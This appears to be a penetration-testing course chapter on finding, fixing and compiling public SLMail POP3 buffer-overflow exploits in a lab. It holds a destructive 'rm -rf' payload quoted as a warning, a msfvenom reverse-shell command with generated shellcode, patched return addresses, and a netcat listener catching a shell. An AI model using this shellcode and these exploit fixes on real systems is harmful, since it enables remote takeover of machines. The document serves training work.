# 9. - Woking with Exploits

Now that we unsderstand the mechanims behind the buffer overflow class of vulnerabilities, we can proceed to inspect and use other people's exploits. There is an import problem with this. Quit often, malicious hackers release fake exploits into the wild, with the purpose of compromising, or otherwise harming, anyone runnig this code.

The exploit code prompts the user to run it as **root**, which is already suspicious:

```c
if (getuid()) {
    puts("Root is required for raw sockets, etc.");
    return 1;
}
```

Further examination of the shellcode payload shows that the actual payload will execute some evil commands, such as:

```bash
rm -rf ~ /* 2> /dev/null &
```

Which would effectively wipe out your Kali machine. The shellcode then proceeds to connect to a public IRC server and announce your idiocy. So if the Internet is riddled with harmful exploits, where can we find reliable ones?

## 9.1 - Searching for Exploits

There are several reliable sources for public exploit code, such as the **[Exploit-Database](https://www.exploit-db.com/)** and **[SecurityFocus](https://www.securityfocus.com/)** vulnerability archives. The exploits on these sites usually undergo close examination, and are not published if deemed fake.

### 9.1.1 - Finding Exploits in Kali Linux

The Exploit Database is maintained by Offensive Security, and provides an offline copy of all the archived exploits it contains. This archive is present in Kali Linux, and has some useful search features. In the following example, exploits with a matching "slmail" string description are found:

```
root@kali:~# searchsploit slmail
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
SLmail Pro 6.3.1.0 - Multiple Remote D | exploits/windows/dos/31563.txt
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/16399.rb
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/638.py
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/643.c
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/646.c
--------------------------------------- ----------------------------------------
Shellcodes: No Result
```

### 9.1.2 - Finding Exploits on the Web

The Exploit Database and SecurityFocus exploit archives are both trustworthy sources of exploits, which get updated on a daily basis. In addition, the Exploit Database occasionally matches exploits to vulnerable installations of software, for research purposes.

![exploit-database](https://image.ibb.co/mULxUx/image.png)

SecurityFocus exploit archives will often contain exploit code:

![securityfocus](https://preview.ibb.co/n9wMpx/image.png)

#### 9.1.2.1 - Exercises

1. Identify products that have  a history of problems. Identify products that are typically hard to path.

> ...

2. Look at the frequency of what sort of exploits are released. Can you identify which types of exploits are more common than others?

> ...

3. Understand the different between a reported vulnerability and an exploit.

> ...

## 9.2 - Customizing and Fixing Exploits

Due to varying development enviroments, vulnerable software versions, and different software patches, it is understandable that many (if not most) of the public exploits found on the Internet will not work, straight out of the box. We'll' find everything from wrong offsets, return addressess intended for different operating systems or path levels, and bad code.
Adding to this mess, many exploits might be one shots, meaning that if the exploit is unsuccessful, the service will crash, and will not be available for further exploitation attempts until it is restarted, or until the machine is rebooted.

### 9.2.1 - Setting Up a Development Environment

For the reasons above, we will never run an exploit without first examining its code, and understanding its inner workings. Once we have done that, we will set up a small development environment which matches the operating system version and vulnerable software version, in order to test and improve existing exploits. Once we are fairly certain that our fixed exploit will work on the target machine, we can then proceed to launch it against our victim.

### 9.2.2 - Dealing with Various Exploit Code Languages

Exploit code can come in all forms. From Python, Perl and Ruby scripts, to C or C++. To further complicate things, languages such as C and C++ have different flavors between Linux/Unix and Windows, and this code is often not cross-compatible.

For example, in our previous search for additional SLMail exploits, in the **exploitdb** archive, we found several results. Let's take a closer look at two of them: **643.c** and **646.c**.

#### 9.2.2.1 - Swapping out Shellcode
Most commonly, public exploits will have shellcode that will not suit our purposes.

From shellcodes that pop up a calculator, to bind shells that might not suit out exploitation environment, to reverse shells with hardcoded IPs.

If the program is easily debuggable, such as SLMail, or if the vulnerability is not sensitive to varying buffer sizes, then swapping out the shellcode for the exploit is a relatively simples task. However, for more complex exploits, such as those that bypass DEP and ASLR, swapping out your shellcode might have negative effects on the exploit, due to changes in shellcode size, and resulting misalignment of various instructions in the exploit.

#### 9.2.2.2 - exploitdb - 643.c

The first exploit we look at has the following C directives:

```
root@kali:~# locate 643.c
			...
/usr/share/exploitdb/exploits/windows/remote/643.c
			...
```

```c
root@kali:~# head /usr/share/exploitdb/exploits/windows/remote/643.c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
```

These suggest that this exploit should be compiled in a Unix like environment, with a compiler such as **gcc**.

We peek at the exploit code, and notice several issues with the exploit that will prevent it working as it is. For one, the return address is not relevant to our target machine.

```c
define retadd "\x9f\x45\x3a\x77" /*win2k server sp4 0x773a459f*/
```

Next, it looks like this exploit uses a hardcoded reverse shell shellcode. Even if the exploit code works, a shell will most probably be sent to an invalid IP, so we''il need to swap out the shellcode. In addition, some buffer offsets seem to be misaligned, which also needs to be fixed to get a working exploit.

Lastly, the exploit posted seems to have a hardcoded IP address for the victim machine:

```
xs = conn("192.168.224.144")
```

#### 9.2.2.3 - exploitdb - 646.c

Looking at this exploit, we notice the following C directives:

```c
root@kali:~# head /usr/share/exploitdb/exploits/windows/remote/646.c
/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```

These directives indicate this code should be compiled in a Windows environment.
Fortunately, Kali Linux has a Windows cross compiler, which we can use for this task, called **mingw**. If not alredy present, we can install it in kali Linux, using the following command:

```bash
root@kali:~# apt install mingw-w64
root@kali:~# apt-get install wine32
```

Once installed we can use the **mingw** crosso compiler to compile this code into a Windows PE executable, and then run this executable on Kali Linux using **wine**.

Before we do that, let's inspect the code.
A galnce is enough to tell us this exploit will most definitely **not** work as-is. Once again, issues such as irrelevant return address and irrelevant shellcode hamper us.

However, with a bit of debugging and massaging, we can get the exploit to work.

```
root@kali:~# i686-w64-mingw32-gcc 646.c -l ws2_32 -o exploit.exe -w
root@kali:~# WINE EXPLOIT.EXE 192.168.11.35

[$]	SLMail Server POP3 PASSWD Buffer Overflow exploit 
[$]	by Mad Ivan	[ void31337	team ] -­ http://exploit.void31337.ru	
  
[+]	Connecting to 192.168.11.35  
[+]	Connected  to 192.168.11.35	
[+]	+OK	POP3 server	offsec-­lab ready <00001.1476799@offsec-­‐lab>  
[+]	Sending	Username...
			...
```

Once the fixed exploit payload is sent, our new reverse shell payload gets executed, and we get a reverse shell back from the SLMail server.

```
root@kali:~# nc -vnlp 4444
listening on [any] 4444
connect to [192.168.10.5] from (UNKNOWN) [192.168.11.35] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Coporation. All rights reserved.

C:\Program Files\SLmail\System>
```

Regardless of whether we get a shell from the compiled exploit, notice that we compiled Windows C code in a Linux machine, and then ran a Windows executable... on Linux!

### 9.2.3 - Exercises

1. Fix and compile 643.c to exploit your SLMail installation

* 0x01 - Create a new shellcode (line 15)

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.106 lport=443 -b "/x00/x0a/x0d/x20/x40" -f c

Payload size: 353 bytes
Final size of c file: 1508 bytes
unsigned char buf[] = 
"\xfc\xbb\x05\x5f\x2e\x11\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf9\xb7\xac\x11\x01"
"\x48\xd1\x98\xe4\x79\xd1\xff\x6d\x29\xe1\x74\x23\xc6\x8a\xd9"
"\xd7\x5d\xfe\xf5\xd8\xd6\xb5\x23\xd7\xe7\xe6\x10\x76\x64\xf5"
"\x44\x58\x55\x36\x99\x99\x92\x2b\x50\xcb\x4b\x27\xc7\xfb\xf8"
"\x7d\xd4\x70\xb2\x90\x5c\x65\x03\x92\x4d\x38\x1f\xcd\x4d\xbb"
"\xcc\x65\xc4\xa3\x11\x43\x9e\x58\xe1\x3f\x21\x88\x3b\xbf\x8e"
"\xf5\xf3\x32\xce\x32\x33\xad\xa5\x4a\x47\x50\xbe\x89\x35\x8e"
"\x4b\x09\x9d\x45\xeb\xf5\x1f\x89\x6a\x7e\x13\x66\xf8\xd8\x30"
"\x79\x2d\x53\x4c\xf2\xd0\xb3\xc4\x40\xf7\x17\x8c\x13\x96\x0e"
"\x68\xf5\xa7\x50\xd3\xaa\x0d\x1b\xfe\xbf\x3f\x46\x97\x0c\x72"
"\x78\x67\x1b\x05\x0b\x55\x84\xbd\x83\xd5\x4d\x18\x54\x19\x64"
"\xdc\xca\xe4\x87\x1d\xc3\x22\xd3\x4d\x7b\x82\x5c\x06\x7b\x2b"
"\x89\x89\x2b\x83\x62\x6a\x9b\x63\xd3\x02\xf1\x6b\x0c\x32\xfa"
"\xa1\x25\xd9\x01\x22\x8a\xb6\x09\xd8\x62\xc5\x09\x1d\xc8\x40"
"\xef\x77\x3e\x05\xb8\xef\xa7\x0c\x32\x91\x28\x9b\x3f\x91\xa3"
"\x28\xc0\x5c\x44\x44\xd2\x09\xa4\x13\x88\x9c\xbb\x89\xa4\x43"
"\x29\x56\x34\x0d\x52\xc1\x63\x5a\xa4\x18\xe1\x76\x9f\xb2\x17"
"\x8b\x79\xfc\x93\x50\xba\x03\x1a\x14\x86\x27\x0c\xe0\x07\x6c"
"\x78\xbc\x51\x3a\xd6\x7a\x08\x8c\x80\xd4\xe7\x46\x44\xa0\xcb"
"\x58\x12\xad\x01\x2f\xfa\x1c\xfc\x76\x05\x90\x68\x7f\x7e\xcc"
"\x08\x80\x55\x54\x38\xcb\xf7\xfd\xd1\x92\x62\xbc\xbf\x24\x59"
"\x83\xb9\xa6\x6b\x7c\x3e\xb6\x1e\x79\x7a\x70\xf3\xf3\x13\x15"
"\xf3\xa0\x14\x3c\xf3\x46\xeb\xbf";
```

* 0x02: Fix the connection IP (victm IP) (line 78)

```
xs = conn("192.168.0.102");
```

* 0x03: Fix null byte (line 63)

```
char *off = malloc(2607);
memset(off, 0x00, 2607);
memset(off, 0x41, 2606);
```

* 0x04: Fix return address (line 12)

```
#define retadd "\x8f\x35\x4a\x5f" /* winXP SP# pt-br 0x5f4a358f*/
```

2. Fix and compile 646.c under Linux using mingw.

> ...